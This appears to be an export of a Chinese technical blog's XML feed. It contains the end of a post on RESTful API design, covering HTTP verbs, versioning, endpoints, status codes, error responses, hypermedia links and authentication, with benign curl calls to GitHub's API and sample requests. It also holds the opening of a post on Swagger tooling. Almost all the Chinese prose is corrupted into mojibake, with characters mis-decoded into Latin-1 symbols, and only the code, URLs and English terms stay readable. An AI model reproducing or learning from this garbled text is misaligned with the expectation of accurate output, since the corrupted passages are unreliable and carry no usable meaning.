çš„APIçš„å¤–è§‚è¦å…ˆäºå¼€å‘å®ƒå®é™…çš„åŠŸèƒ½ã€‚é¦–å…ˆä½ è¦çŸ¥é“æ•°æ®è¯¥å¦‚ä½•è®¾è®¡å’Œæ ¸å¿ƒæœåŠ¡/åº”ç”¨ç¨‹åºä¼šå¦‚ä½•å·¥ä½œ, è¿™éƒ¨åˆ†çš„å·¥ä½œ å¾€å¾€å°±æ˜¯éœ€è¦å†™å¥½ PRDå’ŒDRDè¿™äº›åŠŸèƒ½æ–‡æ¡£ ç«™åœ¨ä½¿ç”¨è€…çš„è§’åº¦è¿›è¡Œåˆç†æŠ½è±¡ æœ‰æ—¶å€™ä¸€ä¸ªé›†åˆå¯ä»¥è¡¨è¾¾ä¸€ä¸ªæ•°æ®åº“è¡¨ï¼Œè€Œä¸€ä¸ªèµ„æºå¯ä»¥è¡¨è¾¾æˆé‡Œé¢çš„ä¸€è¡Œè®°å½•ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯å¸¸æ€ã€‚äº‹å®ä¸Šï¼Œä½ çš„APIåº”è¯¥å°½å¯èƒ½ é€šè¿‡æŠ½è±¡æ¥åˆ†ç¦»æ•°æ®ä¸ä¸šåŠ¡é€»è¾‘ã€‚è¿™ç‚¹éå¸¸é‡è¦ï¼Œåªæœ‰è¿™æ ·åšä½ æ‰ä¸ä¼šæ‰“å‡»åˆ°é‚£äº›æ‹¥æœ‰å¤æ‚ä¸šåŠ¡çš„ç¬¬ä¸‰æ–¹å¼€å‘è€…ï¼Œ å¦åˆ™ä»–ä»¬æ˜¯ä¸ä¼šä½¿ç”¨ä½ çš„APIçš„ã€‚ å¦‚ä½•å¼€æ”¾API å½“ç„¶ä½ çš„æœåŠ¡å¯èƒ½å¾ˆå¤šéƒ¨åˆ†æ˜¯ä¸åº”è¯¥é€šè¿‡APIæš´éœ²å‡ºå»çš„ã€‚æ¯”è¾ƒå¸¸è§çš„ä¾‹å­å°±æ˜¯å¾ˆå¤šAPIæ˜¯ä¸å…è®¸ç¬¬ä¸‰æ–¹æ¥åˆ›å»ºç”¨æˆ·çš„ã€‚ HTTP åŠ¨è¯ä¸€ä¸ªå¥½çš„RESTful APIåªå…è®¸ç¬¬ä¸‰æ–¹è°ƒç”¨è€…ä½¿ç”¨è¿™å››ä¸ªåŠHTTPåŠ¨è¯è¿›è¡Œæ•°æ®äº¤äº’ï¼Œå¹¶ä¸”åœ¨URLæ®µé‡Œé¢ä¸å‡ºç°ä»»ä½•å…¶ä»–çš„åŠ¨è¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒGETè¯·æ±‚å¯ä»¥è¢«æµè§ˆå™¨ç¼“å­˜ï¼ˆé€šå¸¸ä¹Ÿæ˜¯è¿™æ ·çš„ï¼‰ã€‚ä¾‹å¦‚ï¼Œç¼“å­˜è¯·æ±‚å¤´ç”¨äºç¬¬äºŒæ¬¡ç”¨æˆ·çš„POSTè¯·æ±‚ã€‚HEADè¯·æ±‚æ˜¯åŸºäºä¸€ä¸ªæ— å“åº”ä½“çš„GETè¯·æ±‚ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥è¢«ç¼“å­˜çš„ã€‚ GET (é€‰æ‹©)ï¼šä»æœåŠ¡å™¨ä¸Šè·å–ä¸€ä¸ªå…·ä½“çš„èµ„æºæˆ–è€…ä¸€ä¸ªèµ„æºåˆ—è¡¨ã€‚ POST ï¼ˆåˆ›å»ºï¼‰ï¼š åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çš„èµ„æºã€‚ PUT ï¼ˆæ›´æ–°ï¼‰ï¼šä»¥æ•´ä½“çš„æ–¹å¼æ›´æ–°æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªèµ„æºã€‚ PATCH ï¼ˆæ›´æ–°ï¼‰ï¼šåªæ›´æ–°æœåŠ¡å™¨ä¸Šä¸€ä¸ªèµ„æºçš„ä¸€ä¸ªå±æ€§ã€‚ DELETE ï¼ˆåˆ é™¤ï¼‰ï¼šåˆ é™¤æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªèµ„æºã€‚ HEAD ï¼š è·å–ä¸€ä¸ªèµ„æºçš„å…ƒæ•°æ®ï¼Œå¦‚æ•°æ®çš„å“ˆå¸Œå€¼æˆ–æœ€åçš„æ›´æ–°æ—¶é—´ã€‚ OPTIONSï¼šè·å–å®¢æˆ·ç«¯èƒ½å¯¹èµ„æºåšä»€ä¹ˆæ“ä½œçš„ä¿¡æ¯ã€‚ åŸŸå åŸŸåæ˜¯ç”¨äºè®¿é—®ä½ çš„APIæœåŠ¡çš„ç¬¬ä¸€æ­¥ï¼Œå› æ­¤å¦‚ä½•åœ¨åŸŸåä¸Šè¡¨ç°è‡ªå·±æä¾›çš„API æœåŠ¡å–ƒï¼Œä»¥ä¸‹æœ‰2ç§æ–¹æ³• åº”è¯¥å°½é‡å°†APIéƒ¨ç½²åœ¨ä¸“ç”¨åŸŸåä¹‹ä¸‹ã€‚ å¦‚æœç¡®å®šAPIå¾ˆç®€å•ï¼Œä¸ä¼šæœ‰è¿›ä¸€æ­¥æ‰©å±•ï¼Œå¯ä»¥è€ƒè™‘æ”¾åœ¨ä¸»åŸŸåä¸‹ã€‚ 12https://api.example.com # ä¸“ä¸šåŸŸåhttps://example.org/api/ # URIä¸­æ˜ç¡®è¯´æ˜ ç‰ˆæœ¬åŒ– APIæ˜¯æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„ä¸€ä¸ªå…¬å…±å¥‘çº¦ã€‚å¦‚æœä½ å¯¹æœåŠ¡å™¨ä¸Šçš„APIåšäº†ä¸€ä¸ªæ›´æ”¹ï¼Œå¹¶ä¸”è¿™äº›æ›´æ”¹æ— æ³•å‘åå…¼å®¹ï¼Œ é‚£ä¹ˆä½ å°±æ‰“ç ´äº†è¿™ä¸ªå¥‘çº¦ï¼Œå®¢æˆ·ç«¯åˆä¼šè¦æ±‚ä½ é‡æ–°æ”¯æŒå®ƒã€‚ä¸ºäº†é¿å…è¿™æ ·çš„äº‹æƒ…ï¼Œä½ æ—¢è¦ç¡®ä¿åº”ç”¨ç¨‹åºé€æ­¥çš„æ¼”å˜ï¼Œ åˆè¦è®©å®¢æˆ·ç«¯æ»¡æ„ã€‚é‚£ä¹ˆä½ å¿…é¡»åœ¨å¼•å…¥æ–°ç‰ˆæœ¬APIçš„åŒæ—¶ä¿æŒæ—§ç‰ˆæœ¬APIä»ç„¶å¯ç”¨ã€‚ éšç€æ—¶é—´çš„æ¨ç§»ï¼Œä½ å¯èƒ½å£°æ˜ä¸å†æ”¯æŒæŸäº›æ—§ç‰ˆæœ¬çš„APIã€‚ç”³æ˜ä¸æ”¯æŒä¸€ä¸ªç‰¹æ€§å¹¶ä¸æ„å‘³ç€å…³é—­æˆ–è€…ç ´åå®ƒã€‚ è€Œæ˜¯å‘Šè¯‰å®¢æˆ·ç«¯æ—§ç‰ˆæœ¬çš„APIå°†åœ¨æŸä¸ªç‰¹å®šçš„æ—¶é—´è¢«åˆ é™¤ï¼Œå¹¶ä¸”å»ºè®®ä»–ä»¬ä½¿ç”¨æ–°ç‰ˆæœ¬çš„APIã€‚ å¦‚æœä½ åªæ˜¯ç®€å•çš„å¢åŠ ä¸€ä¸ªæ–°çš„ç‰¹æ€§åˆ°APIä¸Šï¼Œå¦‚èµ„æºä¸Šçš„ä¸€ä¸ªæ–°å±æ€§æˆ–è€…å¢åŠ ä¸€ä¸ªæ–°çš„ç«¯ç‚¹ï¼Œä½ ä¸éœ€è¦å¢åŠ APIçš„ç‰ˆæœ¬ã€‚ å› ä¸ºè¿™äº›å¹¶ä¸ä¼šé€ æˆå‘åå…¼å®¹æ€§çš„é—®é¢˜ï¼Œä½ åªéœ€è¦ä¿®æ”¹æ–‡æ¡£å³å¯ã€‚ è¿™é‡Œå®ç°æ–¹å¼æœ‰2ç§ï¼š åº”è¯¥å°†APIçš„ç‰ˆæœ¬å·æ”¾å…¥URL å°†ç‰ˆæœ¬å·æ”¾åœ¨HTTPå¤´ä¿¡æ¯ä¸­ï¼Œä½†ä¸å¦‚æ”¾å…¥URLæ–¹ä¾¿å’Œç›´è§‚, Githubé‡‡ç”¨çš„å°±æ˜¯è¿™ç§åšæ³• 1234567891011121314151617181920https://api.example.com/v1/ # åœ¨URLä¸­è¯´æ˜curl -i https://api.github.com/users/octocat/orgs # HTTPå¤´ä¸­è¡¨ç¤ºAPIç‰ˆæœ¬ HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI APIçš„æ ¹åœ°å€å¾ˆé‡è¦ã€‚å¯ä»¥é€šè¿‡è¿™ä¸ªåˆ—è¡¨å¿«é€Ÿäº†è§£ä½ æä¾›çš„æœåŠ¡ï¼Œå› æ­¤ï¼Œè®©ä½ çš„APIæ ¹å…¥å£ç‚¹ä¿æŒå°½å¯èƒ½çš„ç®€å•ã€‚ä»¥githubçš„åˆ— 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints ä¸€ä¸ªç«¯ç‚¹å°±æ˜¯æŒ‡å‘ç‰¹å®šèµ„æºæˆ–èµ„æºé›†åˆçš„URLã€‚é’ˆå¯¹æ¯ä¸€ä¸ªç«¯ç‚¹æ¥è¯´ï¼Œä½ å¯èƒ½æƒ³åˆ—å‡ºæ‰€æœ‰å¯è¡Œçš„HTTPåŠ¨è¯å’Œç«¯ç‚¹çš„ç»„åˆã€‚ åœ¨RESTfulæ¶æ„ä¸­ï¼Œæ¯ä¸ªç½‘å€ä»£è¡¨ä¸€ç§èµ„æºï¼ˆresourceï¼‰ï¼Œæ‰€ä»¥ç½‘å€ä¸­ä¸èƒ½æœ‰åŠ¨è¯ï¼Œåªèƒ½æœ‰åè¯ï¼Œ è€Œä¸”æ‰€ç”¨çš„åè¯å¾€å¾€ä¸æ•°æ®åº“çš„è¡¨æ ¼åå¯¹åº”ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ•°æ®åº“ä¸­çš„è¡¨éƒ½æ˜¯åŒç§è®°å½•çš„ â€œé›†åˆâ€ï¼ˆcollectionï¼‰ï¼Œæ‰€ä»¥APIä¸­çš„åè¯ä¹Ÿåº”è¯¥ä½¿ç”¨å¤æ•°ã€‚ è¯·æ³¨æ„å¦‚ä½•å±•ç¤ºæ•°æ®ä¹‹é—´çš„å…³ç³»ï¼Œç‰¹åˆ«æ˜¯é›‡å‘˜ä¸åŠ¨ç‰©å›­ä¹‹é—´çš„å¤šå¯¹å¤šå…³ç³»ã€‚é€šè¿‡æ·»åŠ ä¸€ä¸ªé¢å¤–çš„URLæ®µå°±å¯ä»¥å®ç°æ›´å¤šçš„äº¤äº’èƒ½åŠ›ã€‚ å½“ç„¶æ²¡æœ‰ä¸€ä¸ªHTTPåŠ¨è¯èƒ½è¡¨ç¤ºæ­£åœ¨è§£é›‡ä¸€ä¸ªäººï¼Œä½†æ˜¯ä½ å¯ä»¥ä½¿ç”¨DELETEä¸€ä¸ªåŠ¨ç‰©å›­é‡Œçš„é›‡å‘˜æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœã€‚ 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) è¿‡æ»¤å’Œæ’åº ä½¿ç”¨è¿‡æ»¤å’Œæ’åºæœ‰å¤šç§åŸå› ï¼Œå› æ­¤APIåº”è¯¥æä¾›å‚æ•°ï¼Œè¿‡æ»¤å’Œæ’åºè¿”å›ç»“æœï¼Œé™ä½å®¢æˆ·ç«¯çš„å¤æ‚åº¦ã€‚ å¦‚æœè®°å½•æ•°é‡å¾ˆå¤šï¼ŒæœåŠ¡å™¨ä¸å¯èƒ½éƒ½å°†å®ƒä»¬è¿”å›ç»™ç”¨æˆ·ã€‚ ä»å®¢æˆ·ç«¯çš„è§’åº¦æ¥è¯´ï¼Œæœ€å°åŒ–ç½‘ç»œä¼ è¾“ï¼Œå¹¶è®©å®¢æˆ·ç«¯å°½å¯èƒ½å¿«çš„å¾—åˆ°æŸ¥è¯¢ç»“æœã€‚ ä»æœåŠ¡å™¨è§’åº¦æ¥è¯´ï¼Œå“åº”è¯·æ±‚è¶Šå°è´Ÿè½½å°±è¶Šå°ã€‚ 1234?limit=10: å‡å°‘è¿”å›ç»™å®¢æˆ·ç«¯çš„ç»“æœæ•°é‡ï¼ˆç”¨äºåˆ†é¡µï¼‰?offset=10: å‘é€ä¸€å †ä¿¡æ¯ç»™å®¢æˆ·ç«¯ï¼ˆç”¨äºåˆ†é¡µï¼‰?animal_type_id=1: ä½¿ç”¨æ¡ä»¶åŒ¹é…æ¥è¿‡æ»¤è®°å½•?sortby=name&amp;order=asc: å¯¹ç»“æœæŒ‰ç‰¹å®šå±æ€§è¿›è¡Œæ’åº çŠ¶æ€ç  æœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›çš„çŠ¶æ€ç å’Œæç¤ºä¿¡æ¯ï¼Œå› ä¸ºå®ƒä»¬æ˜¯HTTPçš„æ ‡å‡†ï¼Œæ‰€ä»¥é€šç”¨æ€§ä¸Šæœ‰ä¿è¯ï¼Œ çŠ¶æ€ç çš„å®Œæ•´å®šä¹‰è¯·çœ‹HTTP1.1/rfc Status Code define 1234567891011121314151617181920çŠ¶æ€ç èŒƒå›´è¯´æ˜ï¼š1xxï¼šä¿ç•™ç»™åº•å±‚HTTPåŠŸèƒ½ä½¿ç”¨çš„ï¼Œå¹¶ä¸”ä¼°è®¡åœ¨ä½ çš„èŒä¸šç”Ÿæ¶¯é‡Œé¢ä¹Ÿç”¨ä¸ç€æ‰‹åŠ¨å‘é€è¿™æ ·ä¸€ä¸ªçŠ¶æ€ç å‡ºæ¥ã€‚2xxï¼šä¿ç•™ç»™æˆåŠŸæ¶ˆæ¯ä½¿ç”¨çš„ï¼Œä½ å°½å¯èƒ½çš„ç¡®ä¿æœåŠ¡å™¨æ€»å‘é€è¿™äº›çŠ¶æ€ç ç»™ç”¨æˆ·ã€‚3xxï¼šä¿ç•™ç»™é‡å®šå‘ç”¨çš„ã€‚å¤§å¤šæ•°çš„APIä¸ä¼šå¤ªå¸¸ä½¿ç”¨è¿™ç±»çŠ¶æ€ç ï¼Œä½†æ˜¯åœ¨æ–°çš„è¶…åª’ä½“æ ·å¼çš„APIä¸­ä¼šä½¿ç”¨æ›´å¤šä¸€äº›ã€‚4xxï¼šä¿ç•™ç»™å®¢æˆ·ç«¯é”™è¯¯ç”¨çš„ã€‚ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯æä¾›äº†ä¸€äº›é”™è¯¯çš„æ•°æ®æˆ–è¯·æ±‚äº†ä¸å­˜åœ¨çš„å†…å®¹ã€‚è¿™äº›è¯·æ±‚åº”è¯¥æ˜¯å¹‚ç­‰çš„ï¼Œä¸ä¼šæ”¹å˜ä»»ä½•æœåŠ¡å™¨çš„çŠ¶æ€ã€‚5xxï¼šä¿ç•™ç»™æœåŠ¡å™¨ç«¯é”™è¯¯ç”¨çš„ã€‚è¿™äº›é”™è¯¯å¸¸å¸¸æ˜¯ä»åº•å±‚çš„å‡½æ•°æŠ›å‡ºæ¥çš„ï¼Œå¹¶ä¸”å¼€å‘äººå‘˜ä¹Ÿé€šå¸¸æ²¡æ³•å¤„ç†ã€‚å‘é€è¿™ç±»çŠ¶æ€ç çš„ç›®çš„æ˜¯ç¡®ä¿å®¢æˆ·ç«¯èƒ½å¾—åˆ°ä¸€äº›å“åº”ã€‚æ”¶åˆ°5xxå“åº”åï¼Œå®¢æˆ·ç«¯æ²¡åŠæ³•çŸ¥é“æœåŠ¡å™¨ç«¯çš„çŠ¶æ€ï¼Œæ‰€ä»¥è¿™ç±»çŠ¶æ€ç æ˜¯è¦å°½å¯èƒ½çš„é¿å…ã€‚å¸¸è§çš„ä¸€äº›çŠ¶æ€ç ï¼š200 OK - [GET]ï¼šæœåŠ¡å™¨æˆåŠŸè¿”å›ç”¨æˆ·è¯·æ±‚çš„æ•°æ®ï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ï¼ˆIdempotentï¼‰ã€‚201 CREATED - [POST/PUT/PATCH]ï¼šç”¨æˆ·æ–°å»ºæˆ–ä¿®æ”¹æ•°æ®æˆåŠŸã€‚202 Accepted - [*]ï¼šè¡¨ç¤ºä¸€ä¸ªè¯·æ±‚å·²ç»è¿›å…¥åå°æ’é˜Ÿï¼ˆå¼‚æ­¥ä»»åŠ¡ï¼‰204 NO CONTENT - [DELETE]ï¼šç”¨æˆ·åˆ é™¤æ•°æ®æˆåŠŸã€‚400 INVALID REQUEST - [POST/PUT/PATCH]ï¼šç”¨æˆ·å‘å‡ºçš„è¯·æ±‚æœ‰é”™è¯¯ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œæ–°å»ºæˆ–ä¿®æ”¹æ•°æ®çš„æ“ä½œï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ã€‚401 Unauthorized - [*]ï¼šè¡¨ç¤ºç”¨æˆ·æ²¡æœ‰æƒé™ï¼ˆä»¤ç‰Œã€ç”¨æˆ·åã€å¯†ç é”™è¯¯ï¼‰ã€‚403 Forbidden - [*] è¡¨ç¤ºç”¨æˆ·å¾—åˆ°æˆæƒï¼ˆä¸401é”™è¯¯ç›¸å¯¹ï¼‰ï¼Œä½†æ˜¯è®¿é—®æ˜¯è¢«ç¦æ­¢çš„ã€‚404 NOT FOUND - [*]ï¼šç”¨æˆ·å‘å‡ºçš„è¯·æ±‚é’ˆå¯¹çš„æ˜¯ä¸å­˜åœ¨çš„è®°å½•ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œæ“ä½œï¼Œè¯¥æ“ä½œæ˜¯å¹‚ç­‰çš„ã€‚406 Not Acceptable - [GET]ï¼šç”¨æˆ·è¯·æ±‚çš„æ ¼å¼ä¸å¯å¾—ï¼ˆæ¯”å¦‚ç”¨æˆ·è¯·æ±‚JSONæ ¼å¼ï¼Œä½†æ˜¯åªæœ‰XMLæ ¼å¼ï¼‰ã€‚410 Gone -[GET]ï¼šç”¨æˆ·è¯·æ±‚çš„èµ„æºè¢«æ°¸ä¹…åˆ é™¤ï¼Œä¸”ä¸ä¼šå†å¾—åˆ°çš„ã€‚422 Unprocesable entity - [POST/PUT/PATCH] å½“åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå‘ç”Ÿä¸€ä¸ªéªŒè¯é”™è¯¯ã€‚500 INTERNAL SERVER ERROR - [*]ï¼šæœåŠ¡å™¨å‘ç”Ÿé”™è¯¯ï¼Œç”¨æˆ·å°†æ— æ³•åˆ¤æ–­å‘å‡ºçš„è¯·æ±‚æ˜¯å¦æˆåŠŸã€‚ é”™è¯¯å¤„ç†å¦‚æœçŠ¶æ€ç æ˜¯4xxï¼Œå°±åº”è¯¥å‘ç”¨æˆ·è¿”å›å‡ºé”™ä¿¡æ¯ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿”å›çš„ä¿¡æ¯ä¸­å°†errorä½œä¸ºé”®åï¼Œå‡ºé”™ä¿¡æ¯ä½œä¸ºé”®å€¼å³å¯ã€‚ 123&#123; error: "Invalid API key"&#125; è¿”å›ç»“æœ é’ˆå¯¹ä¸åŒæ“ä½œï¼ŒæœåŠ¡å™¨å‘ç”¨æˆ·è¿”å›çš„ç»“æœåº”è¯¥ç¬¦åˆä»¥ä¸‹è§„èŒƒã€‚ 123456GET /collection: è¿”å›ä¸€ç³»åˆ—èµ„æºå¯¹è±¡GET /collection/resource: è¿”å›å•ç‹¬çš„èµ„æºå¯¹è±¡POST /collection: è¿”å›æ–°åˆ›å»ºçš„èµ„æºå¯¹è±¡PUT /collection/resource: è¿”å›å®Œæ•´çš„èµ„æºå¯¹è±¡PATCH /collection/resource: è¿”å›å®Œæ•´çš„èµ„æºå¯¹è±¡DELETE /collection/resource: è¿”å›ä¸€ä¸ªç©ºæ–‡æ¡£ Hypermedia API RESTful APIæœ€å¥½åšåˆ°Hypermediaï¼Œå³è¿”å›ç»“æœä¸­æä¾›é“¾æ¥ï¼Œè¿å‘å…¶ä»–APIæ–¹æ³•ï¼Œä½¿å¾—ç”¨æˆ·ä¸æŸ¥æ–‡æ¡£ï¼Œä¹ŸçŸ¥é“ä¸‹ä¸€æ­¥åº”è¯¥åšä»€ä¹ˆ Hypermedia APIçš„è®¾è®¡è¢«ç§°ä¸ºHATEOAS link: ç”¨æˆ·è¯»å–è¿™ä¸ªå±æ€§å°±çŸ¥é“ä¸‹ä¸€æ­¥è¯¥è°ƒç”¨ä»€ä¹ˆAPIäº† rel: relè¡¨ç¤ºè¿™ä¸ªAPIä¸å½“å‰ç½‘å€çš„å…³ç³»ï¼ˆcollectionå…³ç³»ï¼Œå¹¶ç»™å‡ºè¯¥collectionçš„ç½‘å€ï¼‰ href: APIçš„ç»å¯¹è·¯å¾„ title: APIçš„æ ‡é¢˜,ç”¨äºæ¦‚è¿°ç”¨é€” type: API å“åº”çš„æ•°æ®ç±»å‹ 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; è®¤è¯ è®¤è¯å’Œæˆæƒçš„ç”¨æˆ·æ¨¡å‹è¯¥å°½é‡é‡‡ç”¨RBACæ¨¡å‹ï¼Œå› ä¸ºå…¶è‰¯å¥½çš„æ‰©å®¹æ€§ã€‚ APIè®¤è¯çš„æ‰‹æ®µæœ€å¥½é‡‡ç”¨OAuth2.0, ç®€å•çš„å¯ä»¥é‡‡ç”¨ JWTï¼ˆJson Web Tokenï¼‰ å…³äºOAuthçš„ç®€ä»‹å¯ä»¥å‚è€ƒé˜®ä¸€å³°OAuth2.0ç®€ä»‹ å…³äºJWTå‚è€ƒæ­¤æ–‡JWTä½¿ç”¨ å†…å®¹ç±»å‹ XMLå·²æ˜¯è¿‡å»æ—¶äº†ï¼Œç°ä»£çš„webç»Ÿä¸€ä½¿ç”¨JSONï¼Œä¹Ÿå°±æ˜¯HTTPå¤´ç§çš„Content Typeæ ‡ç­¾é‡‡ç”¨ application/json 1234567891011121314151617181920212223242526è¯·æ±‚æŠ¥æ–‡POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;å“åº”æŠ¥æ–‡HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
      <categories>
        <category>ç¨‹åºè®¾è®¡</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚ä½•ä½¿ç”¨swaggerè®¾è®¡å‡ºæ¼‚äº®çš„RESTful API]]></title>
    <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
    <content type="text"><![CDATA[æŒ‰ç…§ç°åœ¨çš„è¶‹åŠ¿ï¼Œå‰åç«¯åˆ†ç¦»å‡ ä¹å·²ç»æ˜¯ä¸šç•Œå¯¹å¼€å‘å’Œéƒ¨ç½²æ–¹å¼æ‰€è¾¾æˆçš„ä¸€ç§å…±è¯†, åå°åªè´Ÿè´£æ•°æ®çš„æä¾›å’Œè®¡ç®—ï¼Œè€Œå®Œå…¨ä¸å¤„ç†å±•ç°ã€‚è€Œå‰ç«¯åˆ™è´Ÿè´£æ‹¿åˆ°æ•°æ®ï¼Œç»„ç»‡æ•°æ®å¹¶å±•ç°çš„å·¥ä½œã€‚è¿™æ ·ç»“æ„æ¸…æ™°ï¼Œå…³æ³¨ç‚¹åˆ†ç¦»ï¼Œå‰åç«¯ä¼šå˜å¾—ç›¸å¯¹ç‹¬ç«‹å¹¶æ¾è€¦åˆã€‚è€Œå‰æ®µå’Œåç«¯å¯¹å¾…çš„å¥‘çº¦å°±æ˜¯APIè®¾è®¡æ–‡æ¡£, æœ‰äº†APIçš„è®¾è®¡æ–‡æ¡£è¿‡å, åç«¯ä¾æ®è®¾è®¡æ–‡ä»¶å¼€å‘åç«¯ç¨‹åº, å‰æ®µæ ¹æ®APIè®¾è®¡æ–‡æ¡£æ¨¡æ‹ŸæœåŠ¡å™¨,å¼€å‘å‰æ®µé¡µé¢ã€‚è€ŒSwaggerå°±æ˜¯å…¶ä¸­ä¸€ç§æ¯”è¾ƒä¼˜ç§€çš„ RESTful APIè®¾è®¡å·¥å…·ã€‚ swagger å·¥å…·ç®€ä»‹swaggeræ˜¯ä¸€ä¸ªRESTful API çš„è®¾è®¡å·¥å…·ï¼Œå®˜æ–¹æä¾›3ç§å·¥å…·ï¼š swagger-editor åœ¨çº¿ç¼–è¾‘å™¨ï¼ŒåŒæ—¶æä¾›ç¼–è¾‘-å±•ç°-å®¢æˆ·ç«¯-æœåŠ¡ç«¯ä»£ç çš„ç”Ÿæˆ swagger-ui å±•ç¤ºå·¥å…·ï¼Œå°†ç¼–è¾‘å™¨å®šä¹‰å¥½çš„jsonæè¿°æ–‡ä»¶å‹å¥½å±•ç¤ºçš„å·¥å…·ã€‚ swagger-codegen ç”ŸæˆæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„ä»£ç ã€‚ å› ä¸ºswagger-editoré›†æˆäº†swagger-codegenåŠŸèƒ½ï¼Œå› 